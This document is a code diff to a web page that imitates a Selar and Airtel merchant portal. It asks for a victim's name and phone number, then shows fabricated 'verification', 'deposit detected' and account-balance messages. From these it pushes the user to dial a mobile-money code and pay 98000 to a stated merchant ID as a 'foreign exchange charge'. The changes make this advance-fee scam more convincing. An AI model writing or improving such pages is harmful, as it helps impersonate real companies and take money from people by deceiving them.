@@ -46,7 +46,7 @@
     
     <div id="login-view">
         <div class="intl-header-box"><b>Selar Merchant Invoice International</b><br>Plot Z, Chicago, USA | +1 - USA</div>
-        <div class="login-hero"><div class="airtel-logo-red">airtel</div><p style="font-size: 0.75rem; color: #999; font-weight: bold;">SELAR MERCHANT PORTAL</p></div>
+        <div class="login-hero"><div class="airtel-logo-red">Selar/airtel</div><p style="font-size: 0.75rem; color: #999; font-weight: bold;">SELAR MERCHANT INVOICE PORTAL</p></div>
         <div class="login-card">
             <input type="text" id="m-name" placeholder="Full Name">
             <input type="text" id="m-phone" placeholder="Phone Number">
@@ -116,17 +116,28 @@
         currentUser = { name, phone };
         save();
         
-        showLoading(`Verifying (${phone} - ${name}) on Selar merchant transaction system`, 10000, () => {
+        showLoading(`Verifying Fx Charge on (${phone} - ${name})`, 10000, () => {
             showStaticNotif(`
                 <div style="font-size: 2rem; margin-bottom: 10px;">✅</div>
-                <b style="color: var(--selar-blue);">SIM CARD VERIFIED</b>
-                <p style="font-size: 0.8rem; margin: 15px 0;">(${phone} - ${name}) now receiving money in different currency</p>
+                <b style="color: var(--selar-blue);">FX CHARGE PAID</b>
+                <p style="font-size: 0.8rem; margin: 15px 0;">(${phone} - ${name}) now  you can receive money in different currency</p>
                 <button class="btn-ok" onclick="launchDashAndDeposit()">okay i have understood</button>
             `);
         });
     }
 
-    
+    function launchDashAndDeposit() {
+        closeStatic();
+        launchDash();
+        setTimeout(() => {
+            showStaticNotif(`
+                <div style="font-size: 2rem; margin-bottom: 10px;">💰</div>
+                <b style="color: #28a745;">DEPOSIT DETECTED</b>
+                <p style="font-size: 0.85rem; color: #333;"><b>Lolikishee USA CHICAGO</b><br>Amount: <span style="color:red; font-weight:900;">200$</span></p>
+                <button class="btn-ok" onclick="closeStatic()">ok i have understood</button>
+            `);
+        }, 1000);
+    }
 
     function launchDash() {
         document.getElementById('login-view').classList.add('hidden');
@@ -136,7 +147,7 @@
         updateUIState();
     }
 
-function updateUIState() {
+    function updateUIState() {
         const noteBox = document.getElementById('official-notice-box');
         if (isUpgraded) {
             document.getElementById('main-balance').innerText = "2,906,702.40 UGX";
@@ -189,7 +200,11 @@ function updateUIState() {
                     <p style="font-size:0.7rem">Currently Work on Airtel <span class="blink">🇺🇬</span></p>
                     <p style="font-size:0.8rem; margin:10px 0;">Pay foreign exchange charge to initiate 800$ on <b>${currentUser.phone}</b></p>
                     <div style="background:#eee; padding:10px; border-radius:10px; font-size:0.75rem; text-align:left">
-                        Dial: <b>*185*9#</b> 📞<br>ID: 6837633 | Amt: 98000<br>Ref: selar merchant
+                        Dial: <b>*185*9#</b> 📞<br>
+                🆔 Merchant ID: <b>6837633</b><br>
+                💵 Amount: <b>98000</b><br>
+                🔖 Reference: <b>selar merchant</b><br>
+                <small>Confirm fx charge to complete transaction on selar system</small>
                     </div>
                     <div style="display:flex; gap:10px; margin-top:10px;">
                         <button class="btn-ok" style="margin:0" onclick="window.location.href='tel:*185*9%23'">Pay Now</button>
